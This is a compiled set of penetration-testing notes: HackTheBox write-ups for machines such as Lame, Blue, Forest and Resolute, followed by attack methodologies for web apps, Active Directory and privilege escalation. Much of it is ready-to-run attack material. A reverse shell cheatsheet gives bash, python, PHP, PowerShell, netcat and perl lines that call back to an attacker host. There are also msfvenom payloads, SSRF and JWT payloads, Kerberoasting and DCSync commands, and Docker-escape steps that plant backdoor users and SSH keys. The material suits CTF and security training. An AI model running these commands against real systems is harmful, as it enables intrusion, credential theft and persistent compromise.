## HackTheBox Writeup: Lame (Easy Linux)

### Reconnaissance
- nmap -sC -sV -oN lame.nmap 10.10.10.3 revealed: FTP (21, vsftpd 2.3.4), SSH (22), Samba (139/445, 3.0.20-Debian)
- vsftpd 2.3.4 has a known backdoor (CVE-2011-2523) but the exploit failed — the backdoor was patched
- Samba 3.0.20 is vulnerable to CVE-2007-2447 (username map script command injection)

### Exploitation
- Used Metasploit exploit/multi/samba/usermap_script with RHOSTS=10.10.10.3, LHOST=tun0
- Got root shell directly — Samba ran as root

### Key Lessons
- Always check service versions against CVE databases
- Samba usermap_script is a classic easy exploit — no privesc needed
- vsftpd 2.3.4 backdoor is unreliable in practice
- Multiple attack vectors: enumerate all services before committing to one

## HackTheBox Writeup: Jerry (Easy Windows)

### Reconnaissance
- nmap -sC -sV 10.10.10.95 — only port 8080 open (Apache Tomcat 7.0.88)
- Tomcat manager at /manager/html — tried default credentials
- tomcat:s3cret worked for manager login

### Exploitation
- Generated WAR reverse shell: msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war > shell.war
- Uploaded via Tomcat Manager Deploy section
- Got SYSTEM shell — Tomcat running as NT AUTHORITY SYSTEM

### Key Lessons
- Always try default credentials on management interfaces (tomcat:tomcat, admin:admin, tomcat:s3cret)
- WAR file deployment is a classic Tomcat attack vector
- Tomcat Manager allows arbitrary code execution if accessible
- msfvenom WAR payloads are reliable for Tomcat exploitation

## HackTheBox Writeup: Blue (Easy Windows)

### Reconnaissance
- nmap -sC -sV --script vuln 10.10.10.40 — ports 135, 139, 445 open
- Nmap vuln script detected MS17-010 (EternalBlue) — SMBv1 on Windows 7 SP1

### Exploitation
- Used exploit/windows/smb/ms17_010_eternalblue in Metasploit
- Set RHOSTS=10.10.10.40, LHOST=tun0, payload windows/x64/meterpreter/reverse_tcp
- Immediate SYSTEM shell — no user interaction required

### Key Lessons
- MS17-010 (EternalBlue) is one of the most critical Windows exploits (WannaCry used this)
- Always run --script vuln with nmap for quick vulnerability detection
- SMBv1 should always be disabled — massive attack surface
- Patch management is critical — MS17-010 patch available since March 2017

## HackTheBox Writeup: Shocker (Easy Linux)

### Reconnaissance
- nmap -sC -sV 10.10.10.56 — ports 80 (Apache 2.4.18), 2222 (SSH)
- gobuster found /cgi-bin/ then /cgi-bin/user.sh

### Exploitation — Shellshock (CVE-2014-6271)
- curl -A '() { :; }; echo; /usr/bin/id' http://10.10.10.56/cgi-bin/user.sh returned uid=1000(shelly)
- Reverse shell via User-Agent header injection

### Privilege Escalation
- sudo -l showed (root) NOPASSWD: /usr/bin/perl
- sudo perl -e 'exec "/bin/sh";' — root shell

### Key Lessons
- Always enumerate /cgi-bin/ for Shellshock vulnerabilities
- Shellshock affects Bash through environment variables in CGI scripts
- sudo -l is the first privesc check — always do it
- GTFOBins for perl sudo escape: sudo perl -e 'exec "/bin/sh"'

## HackTheBox Writeup: Nibbles (Easy Linux)

### Reconnaissance
- Port 80 open — HTML comment reveals /nibbleblog/
- gobuster on /nibbleblog/ found /admin.php login page
- Guessed credentials: admin:nibbles

### Exploitation
- Nibbleblog 4.0.3 has CVE-2015-6967 — arbitrary file upload via My Image plugin
- Uploaded PHP reverse shell as image through Plugins > My Image
- Triggered at /nibbleblog/content/private/plugins/my_image/image.php

### Privilege Escalation
- sudo -l showed NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
- File didn't exist — created it with bash reverse shell
- sudo /home/nibbler/personal/stuff/monitor.sh — root

### Key Lessons
- HTML source comments often leak sensitive paths
- CMS version-specific exploits: always identify the exact version
- If sudo allows a script you can write/create, instant root
- Writable sudo scripts are a common CTF privesc pattern

## HackTheBox Writeup: Active (Easy Windows — Active Directory)

### Reconnaissance
- Domain Controller: ports 53, 88 (Kerberos), 135, 139, 389 (LDAP), 445
- smbclient -L //10.10.10.100 -N — anonymous access to Replication share
- Found Groups.xml in active.htb Policies Machine Preferences Groups

### GPP Password Decryption
- Groups.xml contained cpassword — Group Policy Preferences encrypted password
- gpp-decrypt → GPPstillStandingStrong2k18
- Credentials: SVC_TGS:GPPstillStandingStrong2k18

### Kerberoasting
- GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
- Got TGS hash for Administrator account
- Cracked with hashcat -m 13100 → Ticketmaster1968
- psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 — SYSTEM

### Key Lessons
- GPP passwords in SYSVOL are a classic AD finding — Microsoft published the AES key
- Always check SMB shares for anonymous access
- Kerberoasting: request TGS tickets for service accounts, crack offline
- Impacket tools (GetUserSPNs.py, psexec.py) are essential for AD pentesting

## HackTheBox Writeup: Forest (Easy Windows — Active Directory)

### Reconnaissance
- Domain Controller: htb.local, ports 88, 135, 389, 445, 5985 (WinRM)
- enum4linux -a 10.10.10.161 — enumerated domain users via RPC null session
- Found users: svc-alfresco, sebastien, lucinda, andy, mark, santi

### AS-REP Roasting
- GetNPUsers.py htb.local/ -usersfile users.txt -dc-ip 10.10.10.161 -no-pass
- svc-alfresco has UF_DONT_REQUIRE_PREAUTH set — got AS-REP hash
- hashcat -m 18200 hash.txt rockyou.txt → s3rvice
- evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice — user shell

### Privilege Escalation — DCSync via Exchange
- BloodHound: svc-alfresco → Account Operators → Exchange Windows Permissions → WriteDacl on domain
- Added svc-alfresco to Exchange Windows Permissions group
- Granted DCSync rights via Add-DomainObjectAcl
- secretsdump.py — dumped Administrator NTLM hash → psexec as SYSTEM

### Key Lessons
- AS-REP Roasting targets accounts without Kerberos pre-authentication
- BloodHound is essential for mapping AD attack paths
- Exchange groups often have excessive AD permissions (WriteDacl)
- DCSync allows dumping all domain hashes — ultimate AD compromise

## HackTheBox Writeup: Cascade (Medium Windows — Active Directory)

### Reconnaissance
- LDAP enumeration found custom attribute cascadeLegacyPwd on user r.thompson — base64 decoded to rY4n5eva
- SMB access as r.thompson revealed VNC registry file with encrypted password

### Lateral Movement
- VNC password decrypted using known DES key: s.smith:sT333ve2
- s.smith had access to Audit$ share containing a .NET SQLite audit application
- Decompiled with dnSpy — found AES decryption routine for TempAdmin password
- Extracted AES key, IV, and ciphertext from SQLite DB

### Privilege Escalation
- TempAdmin password reuse: Administrator:baCT3r1aN00worries

### Key Lessons
- LDAP custom attributes often contain credentials
- VNC passwords use a known static DES key — trivially decryptable
- .NET binaries should be decompiled with dnSpy/ILSpy for hardcoded secrets
- Password reuse between admin accounts is extremely common

## HackTheBox Writeup: Sauna (Easy Windows — Active Directory)

### Reconnaissance
- Domain: EGOTISTICAL-BANK.LOCAL, standard DC ports
- Website revealed employee names on About Us page
- Generated username list: fsmith, hsmith, scoins, sdriver, btaylor, skerb

### AS-REP Roasting
- GetNPUsers.py — fsmith vulnerable, got AS-REP hash
- hashcat -m 18200 → Thestrokes23
- evil-winrm as fsmith

### Privilege Escalation
- winpeas.exe found AutoLogon credentials in registry: svc_loanmgr:Moneymakestheworldgoround!
- BloodHound: svc_loanmgr has DCSync rights (GetChanges + GetChangesAll)
- secretsdump.py → Administrator NTLM hash → pass-the-hash with psexec

### Key Lessons
- Company websites reveal employee names → username enumeration
- Common username formats: first initial + last name (fsmith)
- AutoLogon registry credentials are a goldmine — WinPEAS catches them
- DCSync requires both GetChanges and GetChangesAll ACE

## HackTheBox Writeup: Resolute (Medium Windows — Active Directory + DnsAdmins)

### Reconnaissance
- enum4linux found description on user marko: Account created. Password set to Welcome123!
- Password spray: crackmapexec smb — worked for user melanie

### Lateral Movement
- Found hidden directory C:\PSTranscripts\
- PowerShell transcript log contained credentials: ryan:Serv3r4Admin4cc123!

### Privilege Escalation — DnsAdmins Abuse
- Ryan is member of DnsAdmins group
- DnsAdmins can load arbitrary DLLs into the DNS service (runs as SYSTEM)
- Created malicious DLL, hosted via SMB, loaded via dnscmd
- sc stop dns && sc start dns — SYSTEM shell

### Key Lessons
- User descriptions in AD often contain default passwords
- Password spraying: one password found → spray against all users
- PowerShell transcripts log all commands including credentials
- DnsAdmins group = SYSTEM via DLL injection into DNS service

## Web Application Enumeration Methodology

### Phase 1: Passive Recon
1. Subdomain enumeration: subfinder -d target.com -o subs.txt
2. DNS records: dig target.com ANY, dnsrecon -d target.com
3. Wayback Machine: waybackurls target.com | sort -u > urls.txt
4. Certificate transparency: crt.sh, certspotter
5. Google dorks: site:target.com filetype:pdf|doc|xls|conf|env|bak|sql

### Phase 2: Active Scanning
1. Port scan: nmap -sC -sV -oA target target.com
2. Web tech detection: whatweb target.com, wappalyzer
3. Directory brute-force: feroxbuster -u http://target.com -w raft-medium-directories.txt -x php,html,txt,bak
4. Virtual host discovery: gobuster vhost -u http://target.com -w subdomains-top1million-5000.txt
5. API endpoint discovery: ffuf -u http://target.com/api/FUZZ -w api-endpoints.txt

### Phase 3: Vulnerability Testing
1. Parameter fuzzing: arjun -u http://target.com/page
2. SQL injection: sqlmap -u 'http://target.com/page?id=1' --batch --dbs
3. XSS testing: dalfox url http://target.com/search?q=test
4. SSRF testing: test internal URLs in parameters
5. File inclusion: ?file=../../../../etc/passwd, ?file=php://filter/convert.base64-encode/resource=index
6. Authentication testing: default creds, brute force, JWT manipulation

### Phase 4: Post-Exploitation Web
1. Webshell upload: test extensions (php, phtml, php5, phar)
2. Database access: dump credentials, find other service credentials
3. Configuration files: /etc/nginx/nginx.conf, .env, config.php, web.config
4. Pivot: use webshell to enumerate internal network

## Active Directory Attack Methodology

### Phase 1: Enumeration (No Credentials)
1. NULL session: enum4linux -a DC_IP, rpcclient -U '' DC_IP
2. DNS zone transfer: dig axfr domain.local @DC_IP
3. LDAP anonymous: ldapsearch -x -H ldap://DC_IP -b '' namingContexts
4. SMB shares: smbclient -L //DC_IP -N, crackmapexec smb DC_IP --shares
5. AS-REP Roasting: GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP -no-pass

### Phase 2: With Credentials (Low Priv)
1. BloodHound collection: bloodhound-python -d domain.local -u user -p pass -ns DC_IP -c all
2. Kerberoasting: GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request
3. LDAP enumeration: ldapdomaindump -u 'domain\user' -p pass DC_IP
4. GPP passwords: check SYSVOL manually
5. ACL abuse: BloodHound → shortest path to Domain Admin
6. SMB relay: responder + ntlmrelayx.py

### Phase 3: Lateral Movement
1. Pass-the-Hash: crackmapexec smb target -u admin -H NTLM_HASH
2. WinRM: evil-winrm -i target -u user -p pass
3. PsExec: psexec.py domain/user:pass@target
4. WMI: wmiexec.py domain/user:pass@target
5. DCOM: dcomexec.py domain/user:pass@target

### Phase 4: Privilege Escalation
1. DCSync: if WriteDacl/GetChanges/GetChangesAll → secretsdump.py
2. DnsAdmins: DLL injection → SYSTEM on DC
3. Print Spooler: printerbug.py → coerce authentication
4. Constrained Delegation: getST.py -spn target -impersonate admin
5. Unconstrained Delegation: coerce DC auth → capture TGT
6. Resource-Based Constrained Delegation: write to msDS-AllowedToActOnBehalfOfOtherIdentity
7. Shadow Credentials: write to msDS-KeyCredentialLink

### Phase 5: Domain Dominance
1. Golden Ticket: ticketer.py with KRBTGT hash
2. Silver Ticket: forge TGS for specific services
3. Skeleton Key: master password for all accounts
4. AdminSDHolder: persistent DA access via ACL

## Linux Privilege Escalation Checklist

### Quick Wins (Check First)
1. sudo -l — sudo permissions (NOPASSWD entries, env_keep, wildcards)
2. find / -perm -4000 -type f 2>/dev/null — SUID binaries → GTFOBins
3. cat /etc/crontab && ls -la /etc/cron* — cron jobs with writable scripts
4. ls -la /home/*/.ssh/ — SSH keys lying around
5. cat /etc/passwd | grep -v nologin — users with login shells
6. history or cat ~/.*history — command history with passwords

### System Information
- uname -a — kernel version → searchsploit for kernel exploits
- cat /etc/os-release — OS version
- env — environment variables (passwords, API keys)

### File System Exploration
- find / -writable -type f 2>/dev/null — world-writable files
- find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' 2>/dev/null — config files
- find / -name '*.bak' -o -name '*.old' -o -name '*.swp' 2>/dev/null — backup files
- find / -name '.env' 2>/dev/null — environment files with secrets
- /var/backups/, /opt/, /srv/ — often contain interesting files

### Automated Enumeration
- LinPEAS: comprehensive Linux enumeration
- LinEnum: enumeration script
- linux-exploit-suggester: kernel exploit suggestions
- pspy: monitor processes without root (detects cron jobs)

### Kernel Exploits (by version)
- 2.6.x: Dirty COW (CVE-2016-5195)
- 4.x-5.x: Dirty Pipe (CVE-2022-0847) — 5.8-5.16.11
- Ubuntu overlayfs: CVE-2021-3493

### Capabilities
- getcap -r / 2>/dev/null — files with capabilities
- cap_setuid: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
- cap_dac_read_search: read any file
- cap_net_raw: packet sniffing

## Windows Privilege Escalation Checklist

### Quick Wins (Check First)
1. whoami /priv — check for SeImpersonatePrivilege, SeBackupPrivilege, SeDebugPrivilege
2. whoami /groups — group memberships (Backup Operators, DnsAdmins, etc.)
3. cmdkey /list — stored credentials → runas /savecred
4. reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run — AutoRun programs
5. reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon — AutoLogon credentials
6. schtasks /query /fo TABLE /nh — scheduled tasks

### Service Exploitation
- sc qc ServiceName — check service binary path and start type
- Unquoted service paths: wmic service get name,pathname
- Weak service permissions: accesschk.exe /accepteula -uwcqv Authenticated Users *
- Writable service binaries: replace binary with reverse shell
- DLL hijacking: missing DLLs in writable PATH directories

### Token Impersonation (SeImpersonatePrivilege)
- JuicyPotato: works on Windows 7-10, Server 2008-2016
- PrintSpoofer: works on Windows 10/Server 2016-2019
- RoguePotato: newer alternative to JuicyPotato
- GodPotato: works on Windows 8-11, Server 2012-2022

### Automated Enumeration
- WinPEAS: comprehensive Windows enumeration
- PowerUp: Invoke-AllChecks — service misconfigs, unquoted paths
- Seatbelt: GhostPack — detailed system info collection
- Windows Exploit Suggester: kernel exploits based on systeminfo

## Reverse Shell Cheatsheet

### Bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1

### Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

### PHP
php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'

### PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback + 'PS> ');$stream.Write($sendbyte,0,$sendbyte.Length)};$client.Close()"

### Netcat
nc -e /bin/sh LHOST LPORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f

### Perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

### Shell Upgrade (Interactive TTY)
1. On target: python3 -c 'import pty; pty.spawn("/bin/bash")'
2. Ctrl+Z
3. On attacker: stty raw -echo; fg
4. On target: export TERM=xterm; stty rows 50 cols 200

### msfvenom Payloads
- Linux ELF: msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
- Windows EXE: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
- PHP: msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > shell.php
- WAR (Tomcat): msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war
- ASPX: msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f aspx > shell.aspx

## File Transfer Techniques (Attacker to Target)

### Linux Target — Download from Attacker
Attacker: python3 -m http.server 8080
Target: wget http://LHOST:8080/file OR curl http://LHOST:8080/file -o file
Without wget/curl: bash -c 'cat < /dev/tcp/LHOST/8080 > file'

### Windows Target — Download from Attacker
PowerShell: Invoke-WebRequest http://LHOST:8080/file -OutFile file
PowerShell: (New-Object Net.WebClient).DownloadFile('http://LHOST:8080/file','C:\temp\file')
certutil: certutil -urlcache -split -f http://LHOST:8080/file file.exe
bitsadmin: bitsadmin /transfer job /download /priority high http://LHOST:8080/file C:\temp\file
SMB: impacket-smbserver share . -smb2support (attacker) → copy \\LHOST\share\file (target)

### Upload from Target to Attacker
Netcat: nc -lp 9001 > received_file (attacker) → nc LHOST 9001 < file (target)
SCP: scp file user@LHOST:/tmp/
Python upload server: python3 -m uploadserver 8080 → curl -X POST -F 'files=@file' http://LHOST:8080/upload

## Password Attack Methodology

### Online Attacks (Remote Services)
Hydra SSH: hydra -l admin -P rockyou.txt ssh://TARGET
Hydra HTTP POST: hydra -l admin -P rockyou.txt TARGET http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"
CrackMapExec SMB spray: crackmapexec smb TARGET -u users.txt -p 'Password123!'

### Offline Attacks (Hash Cracking)
hashcat -m 0 hashes.txt rockyou.txt      (MD5)
hashcat -m 1000 hashes.txt rockyou.txt   (NTLM)
hashcat -m 1800 hashes.txt rockyou.txt   (sha512crypt $6$)
hashcat -m 13100 hashes.txt rockyou.txt  (Kerberoast TGS-REP)
hashcat -m 18200 hashes.txt rockyou.txt  (AS-REP Roast)
hashcat -m 5600 hashes.txt rockyou.txt   (NTLMv2 Responder)
hashcat -m 3200 hashes.txt rockyou.txt   (bcrypt)

Rules for mutations: hashcat -m 1000 hashes.txt rockyou.txt -r best64.rule

### Default Credentials
Tomcat: tomcat:tomcat, tomcat:s3cret, admin:admin
Jenkins: admin:admin
Grafana: admin:admin
phpMyAdmin: root:(empty)
WordPress: admin:admin
MSSQL: sa:(empty or Password123!)
MySQL: root:(empty)
Redis/MongoDB/Elasticsearch: no auth by default

## Network Pivoting and Tunneling Techniques

### SSH Tunneling
Local port forward: ssh -L 3306:remote_host:3306 user@pivot_host
Dynamic SOCKS proxy: ssh -D 1080 user@pivot_host (then use proxychains)
Remote port forward: ssh -R 8080:localhost:8080 user@pivot_host
Multi-hop: ssh -J user@pivot1,user@pivot2 user@final_target

### Chisel (HTTP Tunnel)
Attacker: chisel server --reverse --port 8080
Target SOCKS: chisel client ATTACKER:8080 R:socks
Target port forward: chisel client ATTACKER:8080 R:3306:internal_db:3306

### Ligolo-ng (Modern Tunneling)
Attacker: ligolo-proxy -selfcert -laddr 0.0.0.0:443
Target: ligolo-agent -connect ATTACKER:443 -ignore-cert
In proxy: select session, start tunnel, add route on attacker

### socat Port Forwarding
On pivot: socat TCP-LISTEN:8080,fork TCP:target:80

### Metasploit Pivoting
run autoroute -s 10.10.0.0/24 (add route through session)
use auxiliary/server/socks_proxy, set SRVPORT 1080, run

### Windows Pivoting
netsh: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal_target
plink: plink.exe -ssh -L 3306:internal_db:3306 user@attacker

## SSRF (Server-Side Request Forgery) Attack Techniques

### Detection
Look for parameters that accept URLs: url=, uri=, path=, src=, dest=, redirect=, img=, feed=
PDF generators that fetch remote content, webhook URLs, image URL parameters

### Basic Payloads
http://127.0.0.1:80/ — read internal services
http://localhost:8080/admin
http://[::1]:80/ — IPv6 localhost
AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP: http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01

### Bypass Techniques
Decimal IP: http://2130706433/ (127.0.0.1 = 2130706433)
Hex: http://0x7f000001/
Shortened: http://127.1/, http://0/
DNS rebinding, URL encoding, redirect bypass

### Protocol Smuggling
file:///etc/passwd
gopher://127.0.0.1:6379/_SET key value (Redis)
dict://127.0.0.1:6379/CONFIG SET dir /tmp

### Impact
Read internal services and cloud metadata, access AWS keys, port scan internal network, bypass firewalls

## JWT (JSON Web Token) Attack Techniques

### Algorithm Confusion (alg:none)
Change algorithm to 'none' — if server doesn't validate, signature is ignored
Create token with header {"alg":"none","typ":"JWT"}, empty signature

### RS256 to HS256 Confusion
If server uses RS256 (asymmetric), change to HS256 (symmetric)
Sign with the PUBLIC key (which is often available)
Server uses public key as HMAC secret → signature validates
jwt_tool TOKEN -X k -pk public.pem

### Weak Secret Brute Force
hashcat -m 16500 jwt.txt rockyou.txt
jwt_tool TOKEN -C -d rockyou.txt

### JWK/JKU Header Injection
Add jwk (JSON Web Key) in header pointing to attacker's key
Add jku (JWK Set URL) pointing to attacker-hosted key set

### KID (Key ID) Injection
{"alg":"HS256","kid":"/dev/null"} — sign with empty string
{"alg":"HS256","kid":"../../../../../../dev/null"} — path traversal
SQL injection in KID lookup

### Common JWT Claims to Modify
sub: change to admin user ID
role: change to admin
exp: extend expiration

## Docker Container Escape Techniques

### Detection — Am I in a Container?
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker
hostname (usually container ID)
ps aux (very few processes = likely container)

### Escape via Privileged Container
If container runs with --privileged:
mount /dev/sda1 /mnt → chroot /mnt (root on host)
Alternative: nsenter --target 1 --mount --uts --ipc --net --pid -- bash

### Escape via Docker Socket
If /var/run/docker.sock is mounted:
curl --unix-socket /var/run/docker.sock http://localhost/images/json
Create privileged container mounting host root filesystem

### Escape via Capabilities
CAP_SYS_ADMIN: mount host filesystem
CAP_SYS_PTRACE: attach to host processes
Check: capsh --print, cat /proc/self/status | grep Cap

### Escape via Kernel Exploits
Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847)
Container escapes: CVE-2019-5736 (runc), CVE-2020-15257 (containerd)

### Post-Escape
1. mount /dev/sda1 /mnt && ls /mnt/root
2. Install SSH key in /mnt/root/.ssh/authorized_keys
3. Add backdoor user to /mnt/etc/passwd
4. Create cron job in /mnt/etc/crontab

## Buffer Overflow Exploitation Methodology (32-bit, no protections)

### Step 1: Fuzzing — Find the Crash
Send increasing buffer sizes (A * 100, A * 200, ...) until crash
Note the crash length

### Step 2: Find EIP Offset
Use pattern_create.rb to generate unique pattern
Send pattern, check EIP value in debugger
Use pattern_offset.rb to find exact offset

### Step 3: Verify EIP Control
buffer = A * OFFSET + B * 4 + C * 200
EIP should be 42424242 (BBBB)

### Step 4: Find Bad Characters
Send all bytes 0x01 through 0xFF (excluding 0x00)
Check in debugger which characters are mangled
Common bad chars: 0x00, 0x0a, 0x0d

### Step 5: Find JMP ESP
In Immunity Debugger with mona: !mona jmp -r esp -cpb bad_chars
Or search for FFE4 (JMP ESP opcode)
